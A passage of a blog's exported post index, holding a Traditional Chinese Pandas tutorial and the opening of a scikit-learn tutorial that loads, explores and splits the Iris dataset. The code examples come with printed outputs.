        <tag>從零開始學資料科學</tag>
        <tag>Numpy</tag>
        <tag>資料科學</tag>
        <tag>data science</tag>
        <tag>data scientist</tag>
        <tag>matplotlib</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Python 自學資料科學與機器學習入門實戰：Pandas 基礎入門</title>
    <url>/2017/10/28/python-data-science-and-machine-learning-pandas-tutorial/</url>
    <content><![CDATA[
前言本系列文章將透過 Python 及其資料科學生態系（Numpy、Scipy、Pandas、Scikit-learn、Statsmodels、Matplotlib、Scrapy、Keras、TensorFlow 等）來系統性介紹資料科學和相關的知識，透過 Python 帶領讀者進入資料科學的世界和機器學習的世界。在這個單元中我們將介紹 Pandas 這個基於 Numpy 的資料處理和分析神兵利器。
事實上，真實世界並非如此美好，大部分資料分析的工作時間有很大一部分都是在處理髒資料，希望讓資料可以符合模型輸入的需求，而 Pandas 正是扮演這個資料預處理和資料清洗的核心角色，是 Python 在和 R 爭奪資料科學第一程式語言霸主時的生力軍，接下來我們將介紹 Pandas 核心功能和資料的操作方式。

Pandas 核心功能介紹創建資料結構在 Pandas 中主要有兩大資料結構：Series、DataFrame，與 Numpy 中的 ndarray 比較不同的是 Pandas DataFrame 可以存異質資料（不同資料型別）。
Series 類似於 Python 本身的 list 資料結構，不同的是每個元素有自己的 index（可以自己命名）：
%matplotlib inline# 引入 numpy 和 pandas 模組import numpy as np import pandas as pds1 = pd.Series([1, 3, 5, np.nan, 6, 8]) # 使用 Python lits 產生 Series，其中包含一個值為 NaN print(s1)

0    1.0
1    3.0
2    5.0
3    NaN
4    6.0
5    8.0
dtype: float64

s2 = pd.Series(np.random.randint(2, size=[3])) # 使用 np.random.randint 產生 3 個 0-2（不含 2）的數組print(s2)

0    1
1    1
2    1
dtype: int64

DataFrame 可以使用 np.random.randn 產生值來創建，也可以使用 Python dict 進行創建：
# 產生 20170101-20170106 的值，DatetimeIndex([&#x27;2017-01-01&#x27;, &#x27;2017-01-02&#x27;, &#x27;2017-01-03&#x27;, &#x27;2017-01-04&#x27;, &#x27;2017-01-05&#x27;, &#x27;2017-01-06&#x27;], dtype=&#x27;datetime64[ns]&#x27;, freq=&#x27;D&#x27;)dates = pd.date_range(&#x27;20170101&#x27;, periods=6)# 產生 row6,column4 個 standard normal distribution 隨機值，使用 ABCD 當 columns，使用 dates 當 indexdf0 = pd.DataFrame(np.random.randn(6,4), index=dates, columns=list(&#x27;ABCD&#x27;)) print(df0)

                   A         B         C         D
2017-01-01  1.112542 -0.142577  0.832830 -2.755133
2017-01-02 -0.218838 -0.304488  1.437599 -0.402454
2017-01-03  0.295245 -0.786898 -1.231896 -0.224959
2017-01-04 -0.346745 -1.582944 -0.464175 -0.410576
2017-01-05  0.163782  0.948795 -0.420505 -0.641032
2017-01-06  0.515806 -0.935421 -0.701349 -0.820109

# 使用 dict 來創建 DataFrameteams = [&#x27;Web&#x27;, &#x27;Mobile&#x27;, &#x27;Data&#x27;]nums = [12, 14, 34]rd_team_dict = &#123;                &#x27;teams&#x27;: teams,                &#x27;nums&#x27;: nums&#125;rd_team_df = pd.DataFrame(rd_team_dict)print(rd_team_df)

   nums   teams
0    12     Web
1    14  Mobile
2    34    Data

觀察資料# 觀察資料型態、結構、內容值df = pd.DataFrame(&#123; &#x27;A&#x27; : 1.,                    &#x27;B&#x27; : pd.Timestamp(&#x27;20170102&#x27;),                    &#x27;C&#x27; : pd.Series(1,index=list(range(4)),dtype=&#x27;float32&#x27;),                    &#x27;D&#x27; : np.array([3] * 4,dtype=&#x27;int32&#x27;),                    &#x27;E&#x27; : pd.Categorical([&quot;test&quot;,&quot;train&quot;,&quot;test&quot;,&quot;train&quot;]),                    &#x27;F&#x27; : &#x27;foo&#x27; &#125;)# 印出內容值資料型別print(df.dtypes)

A           float64
B    datetime64[ns]
C           float32
D             int32
E          category
F            object
dtype: object

# 印出資料維度print(df.shape)

(4, 6)

# 印出每行資料長度print(len(df))

4

# 印出 DataFrame 資料概況print(df.info())

&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;
Int64Index: 4 entries, 0 to 3
Data columns (total 6 columns):
A    4 non-null float64
B    4 non-null datetime64[ns]
C    4 non-null float32
D    4 non-null int32
E    4 non-null category
F    4 non-null object
dtypes: category(1), datetime64[ns](1), float32(1), float64(1), int32(1), object(1)
memory usage: 180.0+ bytes
None

# 印出基本敘述統計數據print(df.describe())

         A    C    D
count  4.0  4.0  4.0
mean   1.0  1.0  3.0
std    0.0  0.0  0.0
min    1.0  1.0  3.0
25%    1.0  1.0  3.0
50%    1.0  1.0  3.0
75%    1.0  1.0  3.0
max    1.0  1.0  3.0

# 印出首 i 個數據print(df.head(2))

     A          B    C  D      E    F
0  1.0 2017-01-02  1.0  3   test  foo
1  1.0 2017-01-02  1.0  3  train  foo

# 印出尾 i 個數據print(df.tail(2))

     A          B    C  D      E    F
2  1.0 2017-01-02  1.0  3   test  foo
3  1.0 2017-01-02  1.0  3  train  foo

# 印出 index 值print(df.index)

Int64Index([0, 1, 2, 3], dtype=&#39;int64&#39;)

# 印出 columns 值print(df.columns)

Index([&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;], dtype=&#39;object&#39;)

# 印出 values 值print(df.values)

[[1.0 Timestamp(&#39;2017-01-02 00:00:00&#39;) 1.0 3 &#39;test&#39; &#39;foo&#39;]
 [1.0 Timestamp(&#39;2017-01-02 00:00:00&#39;) 1.0 3 &#39;train&#39; &#39;foo&#39;]
 [1.0 Timestamp(&#39;2017-01-02 00:00:00&#39;) 1.0 3 &#39;test&#39; &#39;foo&#39;]
 [1.0 Timestamp(&#39;2017-01-02 00:00:00&#39;) 1.0 3 &#39;train&#39; &#39;foo&#39;]]

# 印出轉置 DataFrameprint(df.T)

                     0                    1                    2  \
A                    1                    1                    1   
B  2017-01-02 00:00:00  2017-01-02 00:00:00  2017-01-02 00:00:00   
C                    1                    1                    1   
D                    3                    3                    3   
E                 test                train                 test   
F                  foo                  foo                  foo   

                     3  
A                    1  
B  2017-01-02 00:00:00  
C                    1  
D                    3  
E                train  
F                  foo  

# sort by the index labels。axis=0 使用 index 進行 sort，axis=1 使用 columns 進行 sort。ascending 決定是否由小到大print(df.sort_index(axis=0, ascending=False))

     A          B    C  D      E    F
3  1.0 2017-01-02  1.0  3  train  foo
2  1.0 2017-01-02  1.0  3   test  foo
1  1.0 2017-01-02  1.0  3  train  foo
0  1.0 2017-01-02  1.0  3   test  foo

# sort by the values of columnsprint(df.sort_values(by=&#x27;E&#x27;))

     A          B    C  D      E    F
0  1.0 2017-01-02  1.0  3   test  foo
2  1.0 2017-01-02  1.0  3   test  foo
1  1.0 2017-01-02  1.0  3  train  foo
3  1.0 2017-01-02  1.0  3  train  foo

選取資料# 選取值的方式一般建議使用 1. loc, 2. iloc, 3. ix# label-location based 行列標籤值取值，以下取出 index=1 那一欄，[列, 行]print(df.loc[0])

A                      1
B    2017-01-02 00:00:00
C                      1
D                      3
E                   test
F                    foo
Name: 0, dtype: object

# iloc 則通過行列數字索引取值，[列，行]print(df.iloc[0:3, 1:2])

           B
0 2017-01-02
1 2017-01-02
2 2017-01-02

# 兼容 loc 和 ilocprint(df.ix[0, &#x27;B&#x27;])

2017-01-02 00:00:00

# 兼容 loc 和 ilocprint(df.ix[1, 3])

3

# 布林取值，取出 A 行大於 0 的資料print(df[df.A &gt; 0])

     A          B    C  D      E    F
0  1.0 2017-01-02  1.0  3   test  foo
1  1.0 2017-01-02  1.0  3  train  foo
2  1.0 2017-01-02  1.0  3   test  foo
3  1.0 2017-01-02  1.0  3  train  foo

# 產生 Series 值s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range(&#x27;20170102&#x27;, periods=6))print(s1)

2017-01-02    1
2017-01-03    2
2017-01-04    3
2017-01-05    4
2017-01-06    5
2017-01-07    6
Freq: D, dtype: int64

# 更新值df.loc[:,&#x27;D&#x27;] = np.array([5] * len(df))print(df)

     A          B    C  D      E    F
0  1.0 2017-01-02  1.0  5   test  foo
1  1.0 2017-01-02  1.0  5  train  foo
2  1.0 2017-01-02  1.0  5   test  foo
3  1.0 2017-01-02  1.0  5  train  foo

處理遺失資料# 查缺補漏df2 = pd.DataFrame(index=dates[0:4], columns=list(df.columns) + [&#x27;E&#x27;])df2.loc[dates[0]:dates[1], :] = 1# drop 掉 NaN 值print(df2.dropna(how=&#x27;any&#x27;))# 補充 NaN 為 3print(df2.fillna(value=3))print(df2)# 回傳 NaN 布林值 print(pd.isnull(df2))# inplace 為 True 為直接操作資料，不是操作 copy 副本df2.dropna(how=&#x27;any&#x27;, inplace=True)

            A  B  C  D  E  F  E
2017-01-01  1  1  1  1  1  1  1
2017-01-02  1  1  1  1  1  1  1
            A  B  C  D  E  F  E
2017-01-01  1  1  1  1  1  1  1
2017-01-02  1  1  1  1  1  1  1
2017-01-03  3  3  3  3  3  3  3
2017-01-04  3  3  3  3  3  3  3
              A    B    C    D    E    F    E
2017-01-01    1    1    1    1    1    1    1
2017-01-02    1    1    1    1    1    1    1
2017-01-03  NaN  NaN  NaN  NaN  NaN  NaN  NaN
2017-01-04  NaN  NaN  NaN  NaN  NaN  NaN  NaN
                A      B      C      D      E      F      E
2017-01-01  False  False  False  False  False  False  False
2017-01-02  False  False  False  False  False  False  False
2017-01-03   True   True   True   True   True   True   True
2017-01-04   True   True   True   True   True   True   True

資料操作# 針對每一個值進行操作df.apply(lambda x: x.max() - x.min())




A    2.696944
B    5.285329
C    1.948946
D    2.615037
dtype: float64

串接資料# 串接資料df = pd.DataFrame(np.random.randn(10, 4))print(df)pieces = [df[:3], df[3:7], df[7:]]print(pieces)print(pd.concat(pieces))

          0         1         2         3
0 -0.171208  2.200967  0.385574 -0.481588
1  1.447335  1.756239  0.083053  0.255434
2 -0.508576  0.818774 -0.438210 -0.819860
3  1.704828 -0.329642 -1.059202 -0.820319
4 -1.792491 -0.761873 -1.090574 -0.484552
5  0.166621  1.704577 -1.613185 -0.391985
6  0.806292  0.699608 -1.768223 -1.081318
7 -1.168532  0.768302  0.831701  0.422367
8  0.065940 -0.038649 -0.060712 -0.500365
9  0.623535  0.558461 -0.956861  1.229675
[          0         1         2         3
0 -0.171208  2.200967  0.385574 -0.481588
1  1.447335  1.756239  0.083053  0.255434
2 -0.508576  0.818774 -0.438210 -0.819860,           0         1         2         3
3  1.704828 -0.329642 -1.059202 -0.820319
4 -1.792491 -0.761873 -1.090574 -0.484552
5  0.166621  1.704577 -1.613185 -0.391985
6  0.806292  0.699608 -1.768223 -1.081318,           0         1         2         3
7 -1.168532  0.768302  0.831701  0.422367
8  0.065940 -0.038649 -0.060712 -0.500365
9  0.623535  0.558461 -0.956861  1.229675]
          0         1         2         3
0 -0.171208  2.200967  0.385574 -0.481588
1  1.447335  1.756239  0.083053  0.255434
2 -0.508576  0.818774 -0.438210 -0.819860
3  1.704828 -0.329642 -1.059202 -0.820319
4 -1.792491 -0.761873 -1.090574 -0.484552
5  0.166621  1.704577 -1.613185 -0.391985
6  0.806292  0.699608 -1.768223 -1.081318
7 -1.168532  0.768302  0.831701  0.422367
8  0.065940 -0.038649 -0.060712 -0.500365
9  0.623535  0.558461 -0.956861  1.229675

合併資料# 合併資料left = pd.DataFrame(&#123;&#x27;key&#x27;: [&#x27;foo&#x27;, &#x27;foo&#x27;], &#x27;lval&#x27;: [1, 2]&#125;)right = pd.DataFrame(&#123;&#x27;key&#x27;: [&#x27;foo&#x27;, &#x27;foo&#x27;], &#x27;rval&#x27;: [4, 5]&#125;)print(pd.merge(left, right, on=&#x27;key&#x27;))

   key  lval  rval
0  foo     1     4
1  foo     1     5
2  foo     2     4
3  foo     2     5

新增資料# 新增資料於最後df = pd.DataFrame(np.random.randn(8, 4), columns=[&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;])print(df)s = df.iloc[3]print(df.append(s, ignore_index=True))

          A         B         C         D
0  1.780499  1.207626  0.631475 -1.747506
1 -0.603999 -2.364099  1.153066  0.504784
2  0.721924  0.199784 -0.158318 -0.882946
3 -0.378070 -0.379311  0.478997  0.271056
4  0.620888 -0.366262 -0.738695 -0.380854
5 -0.587604 -1.728096  0.279645 -0.927843
6 -0.916445  2.921231 -0.795880  0.867531
7 -0.373190  1.526771  0.136712  0.015765
          A         B         C         D
0  1.780499  1.207626  0.631475 -1.747506
1 -0.603999 -2.364099  1.153066  0.504784
2  0.721924  0.199784 -0.158318 -0.882946
3 -0.378070 -0.379311  0.478997  0.271056
4  0.620888 -0.366262 -0.738695 -0.380854
5 -0.587604 -1.728096  0.279645 -0.927843
6 -0.916445  2.921231 -0.795880  0.867531
7 -0.373190  1.526771  0.136712  0.015765
8 -0.378070 -0.379311  0.478997  0.271056

群組操作# 群組操作print(df.groupby([&#x27;A&#x27;,&#x27;B&#x27;]).sum())

                            C         D
A         B                            
-1.232691  0.489020  0.436602 -1.439868
-0.259460 -0.269874  1.655001  0.530137
-0.256261 -0.743254  0.128837  1.050430
 0.015723  0.596866 -0.232503  1.247810
 0.049633 -0.093130  0.895723  1.049938
 0.458667  0.348883 -0.681931 -0.517437
 1.446492  0.007736  0.208870  0.211517
 2.357912 -0.187805 -0.376578 -0.459085

繪圖# 印出圖表ts = pd.Series(np.random.randn(1000), index=pd.date_range(&#x27;1/1/2000&#x27;, periods=1000))ts = ts.cumsum()ts.plot()

&lt;matplotlib.axes._subplots.AxesSubplot at 0x11bc50f98&gt;


輸入&#x2F;輸出# 讀取檔案/輸出檔案，支援 csv, h5, xlsx 檔案格式df.to_csv(&#x27;foo.csv&#x27;)pd.read_csv(&#x27;foo.csv&#x27;)df.to_excel(&#x27;foo.xlsx&#x27;, sheet_name=&#x27;Sheet1&#x27;)print(pd.read_excel(&#x27;foo.xlsx&#x27;, &#x27;Sheet1&#x27;, index_col=None, na_values=[&#x27;NA&#x27;]))

          A         B         C         D
0  1.446492  0.007736  0.208870  0.211517
1  0.049633 -0.093130  0.895723  1.049938
2 -1.232691  0.489020  0.436602 -1.439868
3 -0.259460 -0.269874  1.655001  0.530137
4  0.015723  0.596866 -0.232503  1.247810
5  0.458667  0.348883 -0.681931 -0.517437
6  2.357912 -0.187805 -0.376578 -0.459085
7 -0.256261 -0.743254  0.128837  1.050430

總結以上整理了一些 Pandas 核心功能和如何操作資料，接下來我們將介紹其他 Python 資料科學和機器學習生態系和相關工具。
延伸閱讀
10 Minutes to pandas
Pandas 使用 (1)
Python Pandas - Understanding inplace&#x3D;True
pandas学习笔记
【Python实战】Pandas：让你像写SQL一样做数据分析（一）

（image via pydata、nbcnews）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Machine Learning</tag>
        <tag>機器學習</tag>
        <tag>AI</tag>
        <tag>Artificial Intelligence</tag>
        <tag>NLP</tag>
        <tag>Data Mining</tag>
        <tag>人工智慧</tag>
        <tag>監督式學習</tag>
        <tag>Supervised learning</tag>
        <tag>Numpy</tag>
        <tag>資料科學</tag>
        <tag>data science</tag>
        <tag>data scientist</tag>
        <tag>pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Python 自學資料科學與機器學習入門實戰：Scikit Learn 基礎入門</title>
    <url>/2017/11/24/python-data-science-and-machine-learning-scikit-learn-basic-tutorial/</url>
    <content><![CDATA[
前言本系列文章將透過 Python 及其資料科學與機器學習生態系（Numpy、Scipy、Pandas、scikit-learn、Statsmodels、Matplotlib、Scrapy、Keras、TensorFlow 等）來系統性介紹資料科學與機器學習相關的知識。在這個單元中我們將介紹 scikit-learn 這個機器學習和資料分析神兵利器和基本的機器學習工作流程。接下來我們的範例將會使用 Ananconda、Python3 和 Jupyter Notebook 開發環境進行，若還沒安裝環境的讀者記得先行安裝。首先我們先來認識一下基本機器學習工作流程，讓讀者對於機器學習工作流有基本而全面的認識。
基本機器學習工作流程（Machine Learning Workflow）

明確定義問題 (Problem Definition)
獲取資料與探索性資料分析 (Get Data &amp; Exploratory Data Analysis)
資料預處理與特徵工程 (Data Clean&#x2F;Preprocessing &amp; Feature Engineering)
訓練模型與校調 (Model Training)
模型驗證 (Model Predict &amp; Testing)
模型優化 (Model Optimization)
上線運行 (Deploy Model)

明確定義問題 (Problem Definition)
明確定義問題是進行機器學習工作流的第一步。由於機器學習和一般的 Web 網頁應用程式開發比較不一樣，其需要的運算資源和時間成本比較高，若能一開始就定義好問題並將問題抽象為數學問題將有助於我們要蒐集的資料集和節省工作流程的時間。
舉例來說，本篇文章範例希望預測 Iris 鳶尾花屬於哪一個類別（setosa 山鳶尾、versicolor 變色鳶尾、virginica 維吉尼亞鳶尾），這邊我們就可以決定是要進行有對應結果的監督式學習：二元分類問題（binary classification）、多類別分類問題（multi-classification）還是連續量的迴歸問題（regression），或是沒有標籤結果的非監督式學習（例如：clustering）等，我們這邊假設這是一個多類別分類問題：給定未知資料希望能預測花朵屬於哪一類。換句話說，就是說我們先定義好我們想要解決或是預測的問題，然後去蒐集對應的資料。
獲取資料與探索性資料分析 (Get Data &amp; Exploratory Data Analysis)
基本上資料集的完整性某種程度決定了預測結果是否能發揮模型最大功效。由於我們是教學文章，這邊我們的範例使用 scikit-learn 內建的玩具資料集 Iris（鳶尾花）的花萼、花蕊長寬進行花朵類別判別（setosa 山鳶尾、versicolor 變色鳶尾、virginica 維吉尼亞鳶尾）。在這個資料集中已經幫我們標註好每筆資料對應的類別，所以我們可以視為多類別分類問題（multi-classification）。

引入模組
# 引入 numpy、pd 和 sklearn(scikit-learn) 模組import numpy as npimport pandas as pdfrom sklearn import datasets# 引入 train_test_split 分割方法，注意在 sklearn v0.18 後 train_test_split 從 sklearn.cross_validation 子模組搬到 sklearn.model_selection 中from sklearn.model_selection import train_test_split# 引入 KNeighbors 模型from sklearn.neighbors import KNeighborsClassifierfrom sklearn.svm import LinearSVC

引入資料集並進行探索性資料分析
# 引入 iris 資料集raw_iris = datasets.load_iris()# 探索性分析 Exploratory data analysis，了解資料集內容# 先印出 key 值，列出有哪些值：[&#x27;data&#x27;, &#x27;target&#x27;, &#x27;target_names&#x27;, &#x27;DESCR&#x27;, &#x27;feature_names&#x27;]print(raw_iris.keys())# 印出 feature 值print(raw_iris[&#x27;data&#x27;])# 印出目標值，分別對應的是三種花的類別：[&#x27;setosa 山鳶尾&#x27; &#x27;versicolor 變色鳶尾&#x27; &#x27;virginica 維吉尼亞鳶尾&#x27;]print(raw_iris[&#x27;target&#x27;])# 印出目標標籤，三種花的類別：[&#x27;setosa&#x27; &#x27;versicolor&#x27; &#x27;virginica&#x27;]print(raw_iris[&#x27;target_names&#x27;])# 印出資料集內容描述print(raw_iris[&#x27;DESCR&#x27;])# 印出屬性名稱，[&#x27;sepal length 花萼長度 (cm)&#x27;, &#x27;sepal width 花萼寬度 (cm)&#x27;, &#x27;petal length 花蕊長度 (cm)&#x27;, &#x27;petal width 花蕊寬度 (cm)&#x27;]print(raw_iris[&#x27;feature_names&#x27;])# 類別種類print(np.unique(raw_iris.target))

dict_keys([&#39;data&#39;, &#39;target&#39;, &#39;target_names&#39;, &#39;DESCR&#39;, &#39;feature_names&#39;])
[[ 5.1  3.5  1.4  0.2]
 [ 4.9  3.   1.4  0.2]
 [ 4.7  3.2  1.3  0.2]
 [ 4.6  3.1  1.5  0.2]
 [ 5.   3.6  1.4  0.2]
 [ 5.4  3.9  1.7  0.4]
 [ 4.6  3.4  1.4  0.3]
 [ 5.   3.4  1.5  0.2]
 [ 4.4  2.9  1.4  0.2]
 [ 4.9  3.1  1.5  0.1]
 [ 5.4  3.7  1.5  0.2]
 [ 4.8  3.4  1.6  0.2]
 [ 4.8  3.   1.4  0.1]
 [ 4.3  3.   1.1  0.1]
 [ 5.8  4.   1.2  0.2]
 [ 5.7  4.4  1.5  0.4]
 [ 5.4  3.9  1.3  0.4]
 [ 5.1  3.5  1.4  0.3]
 [ 5.7  3.8  1.7  0.3]
 [ 5.1  3.8  1.5  0.3]
 [ 5.4  3.4  1.7  0.2]
 [ 5.1  3.7  1.5  0.4]
 [ 4.6  3.6  1.   0.2]
 [ 5.1  3.3  1.7  0.5]
 [ 4.8  3.4  1.9  0.2]
 [ 5.   3.   1.6  0.2]
 [ 5.   3.4  1.6  0.4]
 [ 5.2  3.5  1.5  0.2]
 [ 5.2  3.4  1.4  0.2]
 [ 4.7  3.2  1.6  0.2]
 [ 4.8  3.1  1.6  0.2]
 [ 5.4  3.4  1.5  0.4]
 [ 5.2  4.1  1.5  0.1]
 [ 5.5  4.2  1.4  0.2]
 [ 4.9  3.1  1.5  0.1]
 [ 5.   3.2  1.2  0.2]
 [ 5.5  3.5  1.3  0.2]
 [ 4.9  3.1  1.5  0.1]
 [ 4.4  3.   1.3  0.2]
 [ 5.1  3.4  1.5  0.2]
 [ 5.   3.5  1.3  0.3]
 [ 4.5  2.3  1.3  0.3]
 [ 4.4  3.2  1.3  0.2]
 [ 5.   3.5  1.6  0.6]
 [ 5.1  3.8  1.9  0.4]
 [ 4.8  3.   1.4  0.3]
 [ 5.1  3.8  1.6  0.2]
 [ 4.6  3.2  1.4  0.2]
 [ 5.3  3.7  1.5  0.2]
 [ 5.   3.3  1.4  0.2]
 [ 7.   3.2  4.7  1.4]
 [ 6.4  3.2  4.5  1.5]
 [ 6.9  3.1  4.9  1.5]
 [ 5.5  2.3  4.   1.3]
 [ 6.5  2.8  4.6  1.5]
 [ 5.7  2.8  4.5  1.3]
 [ 6.3  3.3  4.7  1.6]
 [ 4.9  2.4  3.3  1. ]
 [ 6.6  2.9  4.6  1.3]
 [ 5.2  2.7  3.9  1.4]
 [ 5.   2.   3.5  1. ]
 [ 5.9  3.   4.2  1.5]
 [ 6.   2.2  4.   1. ]
 [ 6.1  2.9  4.7  1.4]
 [ 5.6  2.9  3.6  1.3]
 [ 6.7  3.1  4.4  1.4]
 [ 5.6  3.   4.5  1.5]
 [ 5.8  2.7  4.1  1. ]
 [ 6.2  2.2  4.5  1.5]
 [ 5.6  2.5  3.9  1.1]
 [ 5.9  3.2  4.8  1.8]
 [ 6.1  2.8  4.   1.3]
 [ 6.3  2.5  4.9  1.5]
 [ 6.1  2.8  4.7  1.2]
 [ 6.4  2.9  4.3  1.3]
 [ 6.6  3.   4.4  1.4]
 [ 6.8  2.8  4.8  1.4]
 [ 6.7  3.   5.   1.7]
 [ 6.   2.9  4.5  1.5]
 [ 5.7  2.6  3.5  1. ]
 [ 5.5  2.4  3.8  1.1]
 [ 5.5  2.4  3.7  1. ]
 [ 5.8  2.7  3.9  1.2]
 [ 6.   2.7  5.1  1.6]
 [ 5.4  3.   4.5  1.5]
 [ 6.   3.4  4.5  1.6]
 [ 6.7  3.1  4.7  1.5]
 [ 6.3  2.3  4.4  1.3]
 [ 5.6  3.   4.1  1.3]
 [ 5.5  2.5  4.   1.3]
 [ 5.5  2.6  4.4  1.2]
 [ 6.1  3.   4.6  1.4]
 [ 5.8  2.6  4.   1.2]
 [ 5.   2.3  3.3  1. ]
 [ 5.6  2.7  4.2  1.3]
 [ 5.7  3.   4.2  1.2]
 [ 5.7  2.9  4.2  1.3]
 [ 6.2  2.9  4.3  1.3]
 [ 5.1  2.5  3.   1.1]
 [ 5.7  2.8  4.1  1.3]
 [ 6.3  3.3  6.   2.5]
 [ 5.8  2.7  5.1  1.9]
 [ 7.1  3.   5.9  2.1]
 [ 6.3  2.9  5.6  1.8]
 [ 6.5  3.   5.8  2.2]
 [ 7.6  3.   6.6  2.1]
 [ 4.9  2.5  4.5  1.7]
 [ 7.3  2.9  6.3  1.8]
 [ 6.7  2.5  5.8  1.8]
 [ 7.2  3.6  6.1  2.5]
 [ 6.5  3.2  5.1  2. ]
 [ 6.4  2.7  5.3  1.9]
 [ 6.8  3.   5.5  2.1]
 [ 5.7  2.5  5.   2. ]
 [ 5.8  2.8  5.1  2.4]
 [ 6.4  3.2  5.3  2.3]
 [ 6.5  3.   5.5  1.8]
 [ 7.7  3.8  6.7  2.2]
 [ 7.7  2.6  6.9  2.3]
 [ 6.   2.2  5.   1.5]
 [ 6.9  3.2  5.7  2.3]
 [ 5.6  2.8  4.9  2. ]
 [ 7.7  2.8  6.7  2. ]
 [ 6.3  2.7  4.9  1.8]
 [ 6.7  3.3  5.7  2.1]
 [ 7.2  3.2  6.   1.8]
 [ 6.2  2.8  4.8  1.8]
 [ 6.1  3.   4.9  1.8]
 [ 6.4  2.8  5.6  2.1]
 [ 7.2  3.   5.8  1.6]
 [ 7.4  2.8  6.1  1.9]
 [ 7.9  3.8  6.4  2. ]
 [ 6.4  2.8  5.6  2.2]
 [ 6.3  2.8  5.1  1.5]
 [ 6.1  2.6  5.6  1.4]
 [ 7.7  3.   6.1  2.3]
 [ 6.3  3.4  5.6  2.4]
 [ 6.4  3.1  5.5  1.8]
 [ 6.   3.   4.8  1.8]
 [ 6.9  3.1  5.4  2.1]
 [ 6.7  3.1  5.6  2.4]
 [ 6.9  3.1  5.1  2.3]
 [ 5.8  2.7  5.1  1.9]
 [ 6.8  3.2  5.9  2.3]
 [ 6.7  3.3  5.7  2.5]
 [ 6.7  3.   5.2  2.3]
 [ 6.3  2.5  5.   1.9]
 [ 6.5  3.   5.2  2. ]
 [ 6.2  3.4  5.4  2.3]
 [ 5.9  3.   5.1  1.8]]
[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1
 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 2
 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2
 2 2]
[&#39;setosa&#39; &#39;versicolor&#39; &#39;virginica&#39;]
Iris Plants Database
====================

Notes
-----
Data Set Characteristics:
    :Number of Instances: 150 (50 in each of three classes)
    :Number of Attributes: 4 numeric, predictive attributes and the class
    :Attribute Information:
        - sepal length in cm
        - sepal width in cm
        - petal length in cm
        - petal width in cm
        - class:
                - Iris-Setosa
                - Iris-Versicolour
                - Iris-Virginica
    :Summary Statistics:

    ============== ==== ==== ======= ===== ====================
                    Min  Max   Mean    SD   Class Correlation
    ============== ==== ==== ======= ===== ====================
    sepal length:   4.3  7.9   5.84   0.83    0.7826
    sepal width:    2.0  4.4   3.05   0.43   -0.4194
    petal length:   1.0  6.9   3.76   1.76    0.9490  (high!)
    petal width:    0.1  2.5   1.20  0.76     0.9565  (high!)
    ============== ==== ==== ======= ===== ====================

    :Missing Attribute Values: None
    :Class Distribution: 33.3% for each of 3 classes.
    :Creator: R.A. Fisher
    :Donor: Michael Marshall (MARSHALL%PLU@io.arc.nasa.gov)
    :Date: July, 1988

This is a copy of UCI ML iris datasets.
http://archive.ics.uci.edu/ml/datasets/Iris

The famous Iris database, first used by Sir R.A Fisher

This is perhaps the best known database to be found in the
pattern recognition literature.  Fisher&#39;s paper is a classic in the field and
is referenced frequently to this day.  (See Duda &amp; Hart, for example.)  The
data set contains 3 classes of 50 instances each, where each class refers to a
type of iris plant.  One class is linearly separable from the other 2; the
latter are NOT linearly separable from each other.

References
----------
   - Fisher,R.A. &quot;The use of multiple measurements in taxonomic problems&quot;
     Annual Eugenics, 7, Part II, 179-188 (1936); also in &quot;Contributions to
     Mathematical Statistics&quot; (John Wiley, NY, 1950).
   - Duda,R.O., &amp; Hart,P.E. (1973) Pattern Classification and Scene Analysis.
     (Q327.D83) John Wiley &amp; Sons.  ISBN 0-471-22361-1.  See page 218.
   - Dasarathy, B.V. (1980) &quot;Nosing Around the Neighborhood: A New System
     Structure and Classification Rule for Recognition in Partially Exposed
     Environments&quot;.  IEEE Transactions on Pattern Analysis and Machine
     Intelligence, Vol. PAMI-2, No. 1, 67-71.
   - Gates, G.W. (1972) &quot;The Reduced Nearest Neighbor Rule&quot;.  IEEE Transactions
     on Information Theory, May 1972, 431-433.
   - See also: 1988 MLC Proceedings, 54-64.  Cheeseman et al&quot;s AUTOCLASS II
     conceptual clustering system finds 3 classes in the data.
   - Many, many more ...

[&#39;sepal length (cm)&#39;, &#39;sepal width (cm)&#39;, &#39;petal length (cm)&#39;, &#39;petal width (cm)&#39;]
[0 1 2]

資料預處理與特徵工程 (Data Clean&#x2F;Preprocessing &amp; Feature Engineering)
良好的資料輸入取決於資料預處理與特徵工程，而好的輸入將大大影響到模型是否可以發揮其理論正常水準。以下把資料轉成 DataFrame 格式方便進行操作。由於這邊的資料集已經是相當完整的資料集，所以我們這邊就不用特別進行資料預處理和特徵工程的部份，然而在真實世界中，真正在進行機器學習工作流程的時候資料預處理往往是最花時間的部份。同時為了方便模型的校調，我們這邊把資料集分為 70% 訓練資料，30% 驗證資料。
# 將資料轉為 pandas DataFrame# data 為觀察目標變數df_X = pd.DataFrame(raw_iris.data)# target 為預測變數df_y = pd.DataFrame(raw_iris.target)# 將資料切分為 training data 和 testing data，其中 random_state 若設為 0 或不設則即便實例不同但因種子相同產生同樣隨機編號，若設為 1 則每次隨機產生不同編號# test_size 為切分 training data 和 testing data 的比例X_train, X_test, y_train, y_test = train_test_split(df_X, df_y, test_size=0.3)

# 印出所有資料集筆數print(len(df_y))
150

# 印出切分 y_train 的數量為所有資料集的 70%，共 105 筆print(y_train)print(len(y_train))
     0
39   0
106  2
99   1
0    0
16   0
118  2
80   1
29   0
11   0
104  2
100  2
72   1
108  2
42   0
20   0
31   0
115  2
111  2
